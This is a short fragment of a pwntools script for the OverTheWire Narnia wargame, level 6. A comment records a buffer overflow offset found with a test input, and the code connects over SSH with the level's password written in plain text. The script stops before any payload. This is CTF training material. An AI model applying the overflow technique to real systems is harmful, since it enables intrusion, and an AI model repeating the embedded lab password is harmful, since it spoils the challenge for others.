from pwn import *

"""
local exploit:
    r AAAA $(python -c 'print "B"* 16 + "C"*4' )
It will show you Segmentation Fault.
So the offset for second arg is 16 bytes.
"""
con = ssh('narnia6', 'narnia.labs.overthewire.org', password='neezocaeng', port=2226)
